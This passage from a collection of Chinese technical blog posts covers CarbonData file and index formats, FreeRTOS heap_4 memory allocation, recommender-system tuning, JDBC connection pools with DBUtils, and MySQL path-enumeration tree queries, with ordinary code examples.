of 0th index in array and surrogate key starts from 1 there 1 is added to i\n      // which is a counter starting from 0\n      sortIndexInverted[dictionarySortModel.getKey() - 1] = i + 1;\n\n假设字典值是beijing，shenzhen，shanghai\n\n\n\n城市\nsurrogate\nsortIndex\ninvertIndex\n\n\nbeijing\n1\n1\n1\n\n\nshenzhen\n2\n3\n3\n\n\nshanghai\n3\n2\n2\n\n\n\n \n \n \n1.3 .dictmeta文件\n该文件主要记录字典的以下属性，具体的类是ColumnDictionaryChunkMeta\n1、最小key\n2、最大的key\n3、开始offset\n4、结束offset\n5、chunk的数量\n2、数据文件详解\n2.1 数据块的组成部分\nCarbonRow在sort阶段会被分成3个部分:\n1、字典列\n2、非字典维度列和高基数列\n3、度量值列\n在写入的时候，先写入到TablePage里，TablePage会把数据拆分成4部分\n\n// one vector to make it efficient for sorting\nprivate ColumnPage[] dictDimensionPages;\nprivate ColumnPage[] noDictDimensionPages;\nprivate ComplexColumnPage[] complexDimensionPages;\nprivate ColumnPage[] measurePages;\n\n 每个TablePage都会记录以下几个Key：\n\nprivate byte[][] currentNoDictionaryKey;\n// MDK start key\nprivate byte[] startKey;\n// MDK end key\nprivate byte[] endKey;\n// startkey for no dictionary columns\nprivate byte[][] noDictStartKey;\n// endkey for no diciotn\nprivate byte[][] noDictEndKey;\n// startkey for no dictionary columns after packing into one column\nprivate byte[] packedNoDictStartKey;\n// endkey for no dictionary columns after packing into one column\nprivate byte[] packedNoDictEndKey;\n\n数据在一行一行写到TablePage之后，最后会做一次统一的编码，详细的方法请看TablePage的encode方法。\nPage的meta信息\n\n  private DataChunk2 buildPageMetadata(ColumnPage inputPage, byte[] encodedBytes)\n      throws IOException {\n    DataChunk2 dataChunk = new DataChunk2();\n    dataChunk.setData_page_length(encodedBytes.length);\n    fillBasicFields(inputPage, dataChunk);\n    fillNullBitSet(inputPage, dataChunk);\n    fillEncoding(inputPage, dataChunk);\n    fillMinMaxIndex(inputPage, dataChunk);\n    fillLegacyFields(dataChunk);\n    return dataChunk;\n  }\n\n一个blocket的阈值是64MB，一个blocket包括N个TablePage，当写满一个TablePage之后，就把blocket写入到文件当中。\ncarbondata的BTree索引，是一个记录着每个Blocklet的mdk的startKey和endKey，以及Blocklet当中所有TablePage的列的最大最小值\n那么数据文件的详细格式，基本和官网上介绍的是一致的\n\n2.2 What is MDK\nmdk和hbase的rowkey是一个性质的，详细可以看下面这张图，排序方式跟hbase没有任何区别。但是carbondata的mdk只能是字典列，如果我没有建立字典列的话，只是设置了SORT_COLUMN，Carbondata的过滤只是靠列的最大最小值\n\n \n3、索引文件详解\n索引文件以.carbonindex结尾\n索引文件包括三个部分：索引头，索引两部分\n索引头包括：\n1、文件格式版本(当前版本是V3)\n2、Segment信息（有多少列，列的基数）\n3、列的信息\n4、bucket ID\n \n索引信息包括以下信息：\n1、Blocket的记录数\n2、数据文件名\n3、Blocket的meta信息offset\n3、BlockletIndex (BTree索引，包含blocket的startKey、endKey，以及每一列的最大最小值，这个前面已经讲过了)\n4、BlocketInfo（记录数，每个TablePage的offset，每个TablePage的长度，维度列dimension_offsets的起始位置，度量值measure_offsets的起始位置，有多少个TablePagenumber_number_of_pages）\n \n索引文件的信息在文件的footer当中也是存在的，在carbondata1.2当中索引文件还是有很多个，感觉有点多余。\n到carbondata1.3会被合并成一个文件，这样就能大大缩短启动的时候加载索引的开销。\n \n \n岑玉海\n转载请注明出处，谢谢！\n \n \n"},{"title":"FreeRTOS--堆内存管理","body":"因为项目需要，最近开始学习FreeRTOS，一开始有些紧张，因为两个星期之前对于FreeRTOS的熟悉度几乎为零，经过对FreeRTOS官网的例子程序的摸索，和项目中问题的解决，遇到了很多熟悉的身影，以前在Linux平台编程的经历给了我一些十分有用的经验，后悔当初没能在第一家公司待下去，浪费了大好时光。好吧，现在还是潜下心来搞搞FreeRTOS吧。\n后续都是一系列FreeRTOS相关的随笔，先把FreeRTOS“圣经”--Mastering the FreeRTOS Real Time kernel -- A Hands On Tutorial Guide 20161204好好研读，接连的几个随笔都是我从这本“圣经”中翻译出来的。翻译难免有所疏漏、词不达意，大家凑合着看吧。\n从FreeRTOS V9.0.0开始FreeRTOS应用程序可以完全用静态分配内存，而没有必要引入堆内存管理。\n章节引言和范围\n前提\nFreeRTOS是以C源文件的形式提供的，因此成为一名合格的C语言编程人员是使用FreeRTOS的必要条件，因而这个章节假定读者熟悉以下概念：\n\nC语言项目是如何构建的，包含不同的编译和链接过程\n堆和栈分别是什么\n标准C库的malloc()和free()函数\n\n动态内存分配以及它和FreeRTOS的关系\n从FreeRTOS V9.0.0开始内核对象既可以在编译的时候静态分配，也可以在运行时动态分配。本书随后的章节将会介绍以下内核对象：tasks, queues, semaphores 和 event groups。为了尽可能让FreeRTOS易于使用，这些内核对象并不是在编译时静态分配的，而是在运行时动态分配的。内核对象创建时FreeRTOS分配RAM而在内核对象删除时释放内存。这样的策略减少了设计和计划上的努力，简化了API，并且减少了RAM的占用。\n动态内存分配是C语言编程的概念，而不是针对FreeRTOS或者多任务编程的概念。它和FreeRTOS是相关的，因为内核对象是动态分配的，并且通用编译器提供的动态内存分配方案对于实时应用程序并不总是适合的。\n内存可以使用标准C库的malloc()和free()函数来分配，但有可能不适合，或者恰当，因为下几点原因：\n\n在小型嵌入式系统中并不总是可用的\n它们的实现可能非常的大，占据了相当大的一块代码空间\n他们几乎都不是线程安全的\n它们并不是确定的，每次调用这些函数执行的时间可能都不一样\n它们有可能产生碎片\n它们有可能打乱链接器的配置\n如果允许堆空间的生长方向覆盖其他变量占据的内存，它们会成为debug的灾难\n\n动态内存分配的可选项\n从FreeRTOS V9.0.0开始内核对象既可以在编译时静态分配也可以在运行时动态分配。如今FreeRTOS把内存分配放在可移植层。这是认识到不同的嵌入式操作有不同的动态内存管理方法和时间要求，因此单个的动态内存分配算法将只适合于应用程序的一个子集。同样，从核心代码库中移除动态内存分配使得应用程序编写者提供自己的特定的实现，如果适合的话。\n当FreeRTOS需要RAM的时候，并不是调用malloc()，而是调用pvPortMalloc()。当需要释放RAM的时候，并不是调用free()，而是调用vPortFree()。pvPortMalloc()和标准C库的malloc()有同样的函数原型，vPortFree()和标准C库的free()有同样的函数原型。\npvPortMalloc() 和 vPortFree()都是公共函数，因此能够被应用代码调用。\nFreeRTOS对于pvPortMalloc()和vPortFree()提供了5种实现，后续章节会讲到。FreeRTOS应用程序可以使用其中的一种，或者使用自己的实现。5种实现分别在heap_1.c, heap_2.c, heap_3.c, heap_4.c 和 heap_5.c文件中，都存在于文件夹 FreeRTOS/Source/portable/MemMang 下。\n范围\n本章节致力于让读者深入理解：\n\nFreeRTOS何时分配RAM\nFreeRTOS 提供的5种内存分配方案\n选用哪一种内存分配方案\n\n内存分配方案示例\nHeap_4 （其他几种暂不去了解）\n和heap_1, heap_2 一样，heap_4也是把数组切割成更小的块。和前面一样，数组是静态声明的，由宏configTOTAL_HEAP_SIZE指定大小，所以这就使得即便数组中的内存还没有被分配出去就让应用程序显得消耗了大量的RAM。\nHeap_4使用了最先适应算法来分配内存。和heap_2不同，heap_4把临近的空闲的存储空间拼凑成一个更大的内存块，这就减少了内存碎片化的风险。\n最先适应算法确保了pvPortMalloc()使用第一块空闲的足够大的内存来满足要申请的字节数。考虑下面的情景：\n\n堆里有3块空闲内存块，它们的大小分别是5个字节，200个字节，100个字节\n调用pvPortMalloc()来申请20个字节的RAM\n满足字节数要求的第一块空闲RAM块是200个字节的RAM块，因此pvPortMalloc()把大小为200个字节的RAM块分割成两块，一块是20个字节，一块是180个字节，然会返回一个指向20个字节的指针。新的180个字节大小的RAM块将在后续的pvPortMalloc()调用中可用。\n\nFigure 7 演示了 heap_4 最先适应算法如何拼接内存，同样也演示了内存的分配和释放：\n\n\nA演示了创建3个任务之后的数组的样子，一大块空的块存在于数组的顶端。\nB演示了删除1个任务之后的数组，一大块空的块存在于数组的顶端。被删除的那个任务占据的TCB和栈存储空间现在是空的，并且它们拼接成一个大的空的块。\nC演示了FreeRTOS创建了一个Queue。队列是通过xQueueCreate() API 创建的，它是调用pvPortMalloc() 来分配存储空间的。由于heap_4采用最先适应算法，pvportMalloc()将会使用第一块大的足够容纳队列的RAM块来分配，在Figure 7中就采用之前删除任务的那一块。然而队列并不完全消耗那个空闲的区块，所以那个RAM块会分成两个部分，未使用的部分将会由后续的pvPortMalloc()占用。\nD演示了应用程序直接调用pvPortMalloc()而不是间接地由FreeRTOS API调用之后的情形。用户分配的区块足够小，能够放在第一个空闲的区块中，这个区块就是队列占用的区块和后面的TCB占用的区块之间的那一块。\n删除任务释放的内存，现在被分割成3个区块，第一个区块是队列，第二个区块是用户分配的，第三个区块还是空的。\nE 演示了队列删除之后，存储空间也自动释放了。现在用户分配的区块两边都是空闲区块。\nF 演示了用户分配的存储空间释放的情形。这个区块现在和两边的空闲区块拼接成了一个更大的空闲区块。\n\nHeap_4并不是确定性的，但是要比标准库函数实现的malloc()和free()运行的更快。\n设定Heap_4数组的起始地址\n此章节包含更高阶的信息，仅仅为了使用Heap_4是没有必要阅读和理解此章节的。\n某些时候应用程序开发者需要指定heap_4数组的起始地址位于某个特定的内存。例如，FreeRTOS 任务的栈是从堆中分配的，就有可能有必要保证堆是分配在快速的内存中，而不是慢速的外存。\n默认情况下，heap_4数组是在heap_4.c源文件中声明的，它的起始地址是由链接器自动确定的。然而，如果在文件FreeRTOSConfig.h中把编译时配置选项configAPPLICATION_ALLOCATED_HEAP设为常量1，那么数组必须由使用FreeRTOS的应用声明。如果把数组声明为应用的一部分，那么应用编写者可以指定数组的起始地址。\n如果把文件FreeRTOSConfig.h中的configAPPLICATION_ALLOCATED_HEAP设定为1，那么应用程序源文件中必须声明一个名字为ucHeap的uint8_t类型的数组，它的大小有configTOTAL_HEAP_SIZE设定。\n把变量放在某个内存地址的语法取决于使用了哪种编译器，下面演示了两种编译器的用法：\n\nListing 2演示的是GCC编译器声明数组并把数组放在名字为.my_heap的段中。\nListing 3演示的是IAR编译器把数组放在内存绝对地址0x20000000上。\n\n\nuint8_t ucHeap [configTOTAL_HEAP_SIZE] attribute (( section(\".my_heap\") ));\n\nListing 2\n\nuint8_t ucHeap [configTOTAL_HEAP_SIZE] @ 0x20000000;\n\nListing 3\n和堆相关的实用函数\nxPortGetFreeHeapSize() API\n这个函数可以获取调用时堆中空闲内存的大小，以字节为单位。使用它可以优化堆的大小。例如，当内核对象都创建完毕后调用xPortGetFreeHeapSize()返回2000，那么可以把configTOTAL_HEAP_SIZE减小2000.\n需要注意，当使用heap_3时是不能调用这个函数的。\nxPortGetMinimumEverFreeHeapSize() API\n此函数返回FreeRTOS应用程序开始运行之后曾经存在的最小的未被分配的存储空间的字节数。它的返回值指示了应用程序离将要耗尽堆空间的接近程度。例如xPortGetMinimunEverFreeHeapSize()返回200个字节，那么从应用程序开始运行之后的某个时间，在使用200个字节就会把堆空间用完。\n需要注意，xPortGetMinimumEverFreeHeapSize()只在使用heap_4或者heap_5时生效。\nMalloc 失败钩子函数\n应用程序可以直接调用pvPortMalloc()。当然在FreeRTOS源文件中每当内核对象创建时也会调用这个函数。此类的内核对象包括任务，队列，信号量和事件组。\n和标准库函数malloc()一样，如果pvPortMalloc()因为申请RAM的大小不能满足没能返回一块RAM空间就会返回NULL。如果编程人员调用pvPortMalloc()来创建内核对象，但是返回NULL就说明内核对象没有创建成功。\n例子中的所有堆分配方案都可以给pvPortMalloc()配置一个钩子函数（也称作回调函数），当pvPortMalloc()返回NULL时调用这个钩子函数。\n如果文件FreeRTOSConfig.h中的configUSE_MALLOC_FAILED_HOOK设置为1，那么应用程序必须提供一个内存分配失败时的钩子函数，它的名字和原型参见如下。只要对这个应用来说是合适的，这个钩子函数可以用任何方法来实现。\n\nvoid vApplicationMallocFailedHook( void );\n\n声明\n欢迎转载，请注明出处和作者，同时保留声明。\n作者：LinTeX9527\n出处：http://www.cnblogs.com/LinTeX9527/p/8007541.html\n本博客的文章如无特殊说明，均为原创，转载请注明出处。如未经作者同意必须保留此段声明，且在文章页面明显位置给出原文连接，否则保留追究法律责任的权利。\n"},{"title":"个性化推荐系统最近一些复盘以及探索","body":"       最近和很多人探讨、交流推荐系统相关很多事情，喜欢这种理性探讨，这种探讨能够让双方都有收获，一个是负\n反馈再有就是对于推荐系统怎样做深入，再有就是推荐系统架构一点思索。\n       负反馈最近探讨很多一个问题。一直有疑惑，大部分的内容都是关于movielens这种含有客户负反馈的，但是我\n只是一个普通的电商网站，只有客户的购买浏览等记录，却缺乏客户不喜欢物品的负反馈，即使是我使用itemcf，也\n只能是单类协同过滤，效果不是很好，查了一些paper，除了使用其他的结合内容，上下文等之外，就只有采样了，\n但是我所在的行业，就算客户没买，也不一定是不喜欢，只是可能不知道而已，想探讨一下，是否了解这种隐反馈的场\n景实际应用中还有没有其他的处理方法呢？\n        这是一个好问题，一个有意思问题，也是我们探讨了很多次问题。负反馈其实我们可以思考一下，不买就是不喜\n欢或者说没推准？那推出来不点击不浏览呢？应是不能作为负反馈的，因为一个用户不点击、不购买因素太多了，钱\n不够？人委屈（对这个素材不满意而已，把品类都降权太极端）了可能都不会去点击。\n        再有就是现在淘宝京东等app对于素材都有负反馈收集，但其实了解到负反馈人很少，因为用户没义务去点击那\n个，他也不愿意去反馈。其实很多用户是不满意就直接走了，不会提意见的，这是实际数据反馈情况。\n        那负反馈要不要做，做是当然要做但要小心做，因为其实很多用户在频道内行为是很有限的，分类召回级直接卡\n掉，点击、浏览、GMV转化等指标应该一下就会降一大截。\n        现在推荐系统，两个方面一个是用户持久喜好，作为离线偏好，这种负反馈尽量不要做。另外是用户实时篇好，\n因为很多情况下用户看到喜欢内容、商品会点击两下看看，真喜欢可能就购买了。实时用户篇好目前是很重要用户推\n荐构成部分，能抓取就抓用户了，抓不住就走了。对于实时篇好可以根据给用户推荐内容、商品都未点击，可以做降\n权处理，不是过滤，过滤要慎重，用户点击多了还要加权，抓住用户实时兴趣，引导用户多浏览、多看。\n       我所在的行业,但是由于某一类目的商品选择较少,导致这一类型各个商品和其他类型的各种商品的相似度都较高,\n导致不管其他什么商品都会很容易推荐这一类目的热门商品,请问您有遇到过这种情况嘛?一般工程上会怎样解决这种\n问题呢?\n        关于推荐系统的热门商品权重过大的问题，除了上面的规则干预，还有没其他的模型计算方法呢？我用的是项亮\n书中的在itemcf时变了分母的幂次，但效果不好，您还知道工程中有其他合适的算法嘛？\n       热门商品是个好东西，但不受控制总是推出热门商品不是一个好的做法，热门商品作为一个单独热门召回级，热\n门商品被关联数量一定要控制，设置相关策略阀值。\n       对于热门商品做热度算法处理，就是热门内容、商品作为召回级，给予阶梯式曝光，如果热门能很大程度提升整\n体转化指标，那么可以给相应加权如做不到进行相应降权。\n       热门商品召回级还有一个很大用处，目前看在一个频道很多用户是行为很少的，热门作为拉新很重要一个手段，\n因为热门某种意义就是命中了大多数人喜好。是作为召回级不够用户很重要一个数据补充渠道，用好还是相当重要。\n       最近探讨另外一个重要点，推荐系统如何做深入，毕竟越深越美，如果有了粗力度召回级，那么就是做细粒度召\n回级。就像文章，最开始做主题LDA分类，但这种分类很粗，加进相似文章召回，数据猛的一升。后来又做了细粒度\n标签比主题细分很多一种划分主题方式，这种就要结合LDA将力度又不要划分太细，不然会发现用户点击两下全是同\n一个内容。\n       内容细的标签，沉下心来仔细想想，很像搜索引擎，用户点击某个标签，然后返回标签下内容。如果把标签理解\n为搜索引擎搜索词，这就是极其类似召回数据方式。很多事情都是相通的，要静下心来去探索、去发现。\n       商品最近也是在探索细粒度召回级事情，以前做的更多是品类，品类作为召回级核心，后边会更多探索用户对于\n品牌、性别、价格段、季节、地理位置、手机信息等多个更细粒度召回级探索。补充完善粗召回级之外内容，预估对\n转化数据都是会有提升的。\n       再有就是也在对于商品标签不断完善，是另外一个方向对于召回级扩大以及更加细分，让用户行为能更精准进行\n推荐。品牌、价格段、性别、商品标签都是对于商品分类召回细化，仔细想想很像是对于内容由主题到标签，粗粒度\n细粒度结合。\n       这些新的尝试对于线上推荐服务、推荐引擎也是一个新的挑战，需要花费心思去将架构抽象化合理化。其实做事\n情难易程度，不在于外界，在于你对于自己要求，要求高了，难度自然就大了。\n       最近在看Google对于分布式系统设计方面内容，收获很多，对于复杂系统给出最简洁设计，是Google设计分布式\n系统很重要设计理念，求于至简，归于永恒。简洁其实是很难很复杂要求很高设计，因为所有事情都考虑到，才能做到\n至简，至繁归于至简。\n\n      扫码关注公众号"},{"title":"JAVA基础-JDBC二（常用的开源工具）","body":"\n一、连接池\n　　在实际的开发应用中，我们常常会对数据库进行大量的高并发的访问，而最原始的连接和操作方式并不能满足这种大量的访问，程序员为了追求更方便、更快捷、更科学安全的开发。第三方的工具类和Dao层的框架就应运而生了。DBCP连接池、和C3P0连接池就是2个常见的开源数据库连接池。\t　　在与数据库进行交互的过程中，获得连接”和“释放资源”是非常消耗系统资源的两个过程，为了解决此类性能问题，通常情况我们采用连接池技术，来共享连接Connection。这样我们就不需要每次都创建连接、释放连接了，这些操作都交给了连接池。用的时候从连接池里拿出来，用完了在给他放回去，下次使用时还可以接着用。\t　　同数据库的链接规范（JDBC）一样,java为数据库连接池也提供了一套规范（接口）- javax.sql.DataSource，各个厂商需要让自己的连接池实现这个接口。这样就方便了应用程序的扩展和我们的使用。\n（一）DBCP连接池\t\n　　DBCP连接池他是一个开源的连接池，属于Apache家族的一员，为Tomcat的内置连接池（自己的土，自己的地...）1、导入炸包\t　　使用第三方工具类的第一件事就是导入jar包，然后Build Patch一下，为了方便jar包的管理（另一方面满足于强迫症患者的整理欲望）一般都在工程下新建一个lib文件夹用来存放炸包。\t　　需要导入的jar包：\t　　* commons-dbcp-1.4.jar\t　　* commons-pool-1.5.6.jar\n2、DBCP连接池的使用\n 　　连接数据库的操作是一个频繁使用，代码重复的操作，可以将其抽取成一个工具类。\t　　Java为数据库连接池也提供了一套规范接口：DataSource，它是java中提供的连接池，作为 DriverManager 工具的替代项。而DBCP包则提供了DataSource接口的实现类 - BasicDataSource类。\n  栗子：\n\npublic class JdbcUtils {\n//定义一个连接池\nprivate static BasicDataSource bd = new BasicDataSource();\n//工具类，私有他的无参构造\nprivate JdbcUtils() {\nsuper();\n}\n//使用静态代码块进行连接池的属性配置 \n//静态代码块是随着类的加载而加载的且只加载一次（节省资源）\nstatic {\n/*\n* 必须设置的项\n*/\n//设置mySQL的驱动\nbd.setDriverClassName(\"com.mysql.jdbc.Driver\");\n//设置要连接数据库的URL\nbd.setUrl(\"jdbc:mysql://localhost:3306/mydb\");\n//设置用户名\nbd.setUsername(\"root\");\n//设置数据库密码\nbd.setPassword(\"root\");\n/*\n* 选择设置的项，不设置的话会有默认值跟着\n*/\n//初始化连接数\nbd.setInitialSize(10);\n//最大连接数\nbd.setMaxActive(15);\n//最大空闲连接数\nbd.setMaxIdle(6);\n//最小空闲连接数\nbd.setMinIdle(3);\n}\n/**\n* 获取连接池对象\n* @return bd 连接池\n*/\npublic static DataSource getDataSource() {\nreturn bd;\n}\n}\n\n（二）C3P0连接池\n 　　C3P0是一个开源的JDBC连接池，它实现了数据源和JNDI绑定，支持JDBC3规范和JDBC2的标准扩展。目前使用它的开源项目有Hibernate，Spring等。（百度百科）\t　　C3P0连接池有自动回收空闲连接的功能，而DBCP没有自动回收空闲连接的功能。1、导入jar包\t　　同DBCP的使用步骤一样，第一步要导入相关的jar包：\t　　c3p0-0.9.1.2.jar2、C3P0连接池的使用\t　　通过查看帮助文档（doc目录下的index.html文件里边有个快速入门）发现C3P0可以通过手动或者配置文件的方式使用。\n 　　 * 通过手动进行配置\n\npublic static void main(String[] args) throws Exception {\n// 获得C3P0连接池对象\nComboPooledDataSource source = new ComboPooledDataSource();\n// 设置驱动\nsource.setDriverClass(\"com.mysql.jdbc.Driver\");\n// 设置连接库的路径\nsource.setJdbcUrl(\"jdbc:mysql:///mydb\");\n// 设置用户名\nsource.setUser(\"root\");\n// 设置密码\nsource.setPassword(\"root\");\n// 通过连接池创建一个QueryRunner对象\nQueryRunner runner = new QueryRunner(source);\n// 测试\nString sql = \"SELECT * FROM users\";\nList<Object[]> list = runner.query(sql, new ArrayListHandler());\nfor (Object[] objects : list) {\nfor (Object object : objects) {\nSystem.out.print(object + \" \");\n}\nSystem.out.println();\n}\n}\n\n 　　\n　　* 通过配置文件进行配置\t　　C3P0连接池支持.xml和属性文件.properties的文件配置，当然了他对其配置文件的名字和里边的文件也有一定的要求（搞一个别的名他就不认识了），XML配置文件的名字一定是c3p0-config.xml，属性配置文件的名字一定是c3p0.properties.默认情况下C3P0连接池就会找类加载路径下的c3p0-config.xml进行解析。c3p0-config.xml配置文件除了一些链接数据库的一些必要属性外也可以配置一些连接池其他的属性：最小池里的数量，最大池里的数量等。具体的属性配置可以百度或者阅读开发文档。\n　　栗子：  * c3p0-config.xml配置文件\n\n<c3p0-config>\n<default-config>\n<property name=\"driverClass\">com.mysql.jdbc.Driver</property>\n<property name=\"jdbcUrl\">jdbc:mysql:///mydb</property>\n<property name=\"user\">root</property>\n<property name=\"password\">root</property>\n</default-config>\n</c3p0-config>\n\n  * C3P0的工具类\n\npublic class C3p0Utils {\n// 定义一个c3p0连接池\nprivate static ComboPooledDataSource source;\n// 定义一个连接对象\nprivate static Connection connection;\n\nprivate C3p0Utils() {\nsuper();\n}\n\nstatic {\n// 初始化连接池\nsource = new ComboPooledDataSource();\ntry {\n// 获得一个连接\nconnection = source.getConnection();\n} catch (Exception e) {\n// TODO Auto-generated catch block\ne.printStackTrace();\n}\n}\n\npublic static Connection getConnection() {\nreturn connection;\n}\n}\n\n 　　通过代码演示可以看到通过配置文件的方式还是非常方便的，后期维护的话只要改相关的配置文件就可以了，xml作为配置文件便于我们的阅读，所以推荐使用c3p0-config.xml配置文件。\n二、DBUtils工具类\t\n　　使用原生的JDBC进行开发，你会发现代码冗余过多，使用麻烦，极度不爽。而工具类的出现就是为了简化我们的开发。DBUtils是apache commons组件一个成员，使用DBUtils工具类首先要导入相关的jar包 - commons-dbutils-1.6.jar。\t　　DBUtils封装并简化了JDBC操作，减少了相关代码的书写、它一共有3个核心的部分组成：\t　　* QueryRunner提供对sql语句操作的API。\t　　* ResultSetHandler接口提供了执行完sql语句后怎样封装结果集。\t　　* DbUtils工具类提供了关闭相关资源和处理事物的方法。1、QueryRunner核心类\t　　* new QueryRunner() ，无参构造，使用无参构造时，调用update，query方法时需要传入Connection对象\t　　* update(Connection conn, String sql, Object... params) ，用来完成表数据的增加、删除、更新操作。\t　　* query(Connection conn, String sql, ResultSetHandler<T> rsh, Object... params) ，用来完成表数据的查询操作。------------------------------------------------------------------------------------------------------------------------------------------------------------------\t　　* new QueryRunner(DataSource ds) ，带参构造，使用带参构造时调用update，query方法无需要传入Connection对象\t　　* update(String sql, Object... params) ，用来完成表数据的增加、删除、更新操作。\t　　* query(String sql, ResultSetHandler<T> rsh, Object... params) ，用来完成表数据的查询操作。\n\t　　栗子：  * 无参构造的update方法\n\n/**\n* 增加操作\n* @throws SQLException\n*/\nprivate static void method01() throws SQLException {\n// 通过工具类获得连接\nConnection connection = JdbcUtilsConfig.getConnection();\n// 获得QueryRunner对象\nQueryRunner runner = new QueryRunner();\n// 编写sql语句\nString insert = \"INSERT INTO sort(sname,sprice,sdesc) VALUES(?,?,?)\";\n// 执行update方法，也可以将数据存到Object数组里然后传入数组，返回值为影响的行数\nint update = runner.update(connection, insert, \"家具\", 1000, \"很好用\");\nSystem.out.println(update);\n}\n\n/**\n* 更新操作\n* \n* @throws SQLException\n*/\nprivate static void method02() throws SQLException {\n// 通过工具类获得连接\nConnection connection = JdbcUtilsConfig.getConnection();\n// 获得QueryRunner对象\nQueryRunner runner = new QueryRunner();\n// 编写sql语句\nString s = \"UPDATE sort SET sname=?,sprice=?,sdesc=? WHERE sid=4\";\n// 执行update方法\nrunner.update(connection, s, \"花卉\", 100, \"买给你爱的人\");\n//安静的关闭\nDbUtils.closeQuietly(connection);\n}\n\n/**\n* 删除操作\n* \n* @throws SQLException\n*/\nprivate static void method03() throws SQLException {\n// 通过工具类获得连接\nConnection connection = JdbcUtilsConfig.getConnection();\n// 创建一个QueryRunner对象，用来完成SQL语句的执行\nQueryRunner qr = new QueryRunner();\n// 执行SQL语句\nString sql = \"DELETE FROM zhangwu WHERE name = ?\";\nObject[] params = { \"股票收入\" };\nint line = qr.update(connection, sql, params);\n// 结果集的处理，影响的行数\nSystem.out.println(\"line=\" + line);\n}\n\n \n　　* 有参构造的query方法\n\npublic static void main(String[] args) throws Exception {\n// 通过工具类获得连接池对象\nDataSource dataSource = C3p0Utils.getDataSource();\n// 通过连接池创建一个QueryRunner对象\nQueryRunner runner = new QueryRunner(dataSource);\n// 编写sql语句\nString sql = \"SELECT * FROM users\";\n// 执行query方法传入ArrayListHandler返回集合\nList<Object[]> list = runner.query(sql, new ArrayListHandler());\n// 遍历集合\nfor (Object[] objects : list) {\nfor (Object object : objects) {\nSystem.out.print(object + \" \");\n}\nSystem.out.println();\n}\n}\n\n \n2、ResultSetHandler结果集处理类\t　　* ArrayHandler  将结果集中的第一条记录封装到一个Object[]数组中，数组中的每一个元素就是这条记录的值。\t　　* ArrayListHandler  将结果集中的每一条记录都封装到一个Object[]数组中，将这些数组在封装到List集合中。\t　　* BeanHandler  将结果集中第一条记录封装到一个指定的javaBean中。\t　　* BeanListHandler  将结果集中每一条记录封装到指定的javaBean中，将这些javaBean在封装到List集合中。\t　　* ColumnListHandler  将结果集中指定的列的字段值，封装到一个List集合中。\t　　* ScalarHandler  它是用于单数据。例如sql中的聚合函数SUM(),Count()等。\t　　* MapHandler  将结果集第一行封装到Map集合中,Key 列名, Value 该列数据，可以配合工具类BeanUtils.populate(Bean bean, Map map);一起使用方便数据的封装。\t　　* MapListHandler  将结果集第一行封装到Map集合中,Key 列名, Value 该列数据,Map集合存储到List集合。\t\t　　常用Handler举例:  *BeanHandler的栗子：\n\n/**\n     * 商品详情查询\n     * \n     * @param pid\n     * @return product\n     * @throws Exception\n     */\n    @Override\n    public Product findByPid(String pid) throws Exception {\n        //通过连接池创建QueryRunner对象\n        QueryRunner queryRunner = new QueryRunner(C3p0Utils.getDataSourse());\n        //根据传入的商品ID编写sql语句\n        String sql = \"SELECT * FROM product WHERE pid=?\";\n        //传入sql语句和BeanHandler结果集返回商品Bean\n        Product product = queryRunner.query(sql, new BeanHandler<Product>(Product.class), pid);\n        return product;\n    }\n\n  * ScalarHandler的栗子：\n\n    /**\n     * 商品总数查询\n     * @return totalCount\n     * @throws Exception\n     */\n    @Override\n    public Integer findAdmintotalCount() throws Exception {\n        QueryRunner queryRunner = new QueryRunner(C3p0Utils.getDataSourse());\n        //pflag字段为是否下架\n        String sql = \"SELECT COUNT(*) FROM product WHERE pflag=?\";\n        Long totalCount = (Long) queryRunner.query(sql, new ScalarHandler(),Product.UN_FLAG);\n        //将Long转换成Integer类型返回\n        return totalCount.intValue();\n    }\n\n  * BeanListHandler的栗子：\n\n/**\n     * 根据类别查询商品\n     * \n     * @param cid 商品ID\n     * @param beginPage 起始页\n     * @param pageSize 每页显示的条数\n     * @return list\n     * @throws Exception\n     */\n    @Override\n    public List<Product> findPageByCid(String cid, Integer beginPage, Integer pageSize) throws Exception {\n        QueryRunner queryRunner = new QueryRunner(C3p0Utils.getDataSourse());\n        //分页查询\n        String sql = \"SELECT * FROM product WHERE cid=? AND pflag=? LIMIT ?,?\";\n        //BeanListHandler里泛型要写你查询实体Bean类型，传入参数为Bean.class\n        List<Product> list = queryRunner.query(sql, new BeanListHandler<Product>(Product.class), cid, Product.UN_FLAG,\n                beginPage, pageSize);\n        //返回结合\n        return list;\n    }\n\n \n3、DbUtils工具类\t　　此类提供了关闭相关资源和处理事物的方法：\t　　* DbUtils.closeQuietly()  安静的关闭资源。"},{"title":"【MySQL疑难杂症】如何将树形结构存储在数据库中（方案二 Path Enumeration）","body":"　　今天来介绍把树形结构存入数据库的第二种方法——路径枚举法。\n　　还是借用上一篇的栗子，为了方便大家查阅，我把图又原样搬过来了。\n\n　　需要回答的问题依旧是这样几个：\n　　1.查询小天的直接上司。\n　　2.查询老宋管理下的直属员工。\n　　3.查询小天的所有上司。\n　　4.查询老王管理的所有员工。\n方案二、 Path Enumeration 路径枚举法，记录下根节点到每个子节点的路径。\n　　先创建表：\n\nCREATE TABLE employees2(\neid INT,\nename VARCHAR(100),\nposition VARCHAR(100),\npath VARCHAR(200)\n)\n\n　　然后插入数据：\n\n　　现在我们来回答一下之前的问题：\n　　1.查询小天的直接上司。\n　　在上一个解决方案中能轻而易举做到的事情，在这个方案中却有些麻烦了，因为需要对path字段进行字符串处理，去掉“/”+自身id才是直接上司的path值。又开始一顿骚操作：\n　　SELECT e1.eid,e1.ename FROM employees2 e1,employees2 e2 WHERE e2.ename = '小天' AND e1.path = REPLACE(e2.path,CONCAT('/',e2.eid),'');\n　　好像这个操作还不够sao，2333，结果如下：\n　　\n　　2.查询老宋管理下的直属员工。\n　　怎么查管理下的直属员工呢？那就要用模糊查询了：\n　　SELECT e2.eid,e2.ename FROM employees2 e1,employees2 e2 WHERE e1.ename = '老宋' AND e2.path REGEXP CONCAT(e1.path,'/[0-9]{1,}$');\n　　这里用了正则匹配，匹配所有path符合规则的记录，结果如下：\n　　\n　　3.查询小天的所有上司。\n　　SELECT e1.eid,e1.ename FROM employees2 e1,employees2 e2 WHERE e2.ename='小天' AND e2.path like concat(e1.path,'/%');\n　　这里就能体现这种存储结构的优势了。不看效率的话，还是很方便的。\n　　\n　　4.查询老王管理的所有员工。\n　　SELECT e2.eid,e2.ename FROM employees2 e1,employees2 e2 WHERE e1.ename='老王' AND e2.path like concat(e1.path,'/%');\n　　看吧，查起来就so easy了。\n　　\n　　不用像之前那样写一大段存储过程了，简单粗暴。\n　　